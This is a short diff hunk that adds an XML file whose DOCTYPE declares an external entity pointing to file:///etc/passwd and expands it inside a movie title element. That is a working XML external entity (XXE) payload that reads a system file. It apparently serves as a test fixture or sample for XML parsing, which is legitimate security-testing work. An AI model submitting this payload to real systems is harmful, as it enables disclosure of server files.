@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE movie [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
+<movie><title>&secret;</title></movie>
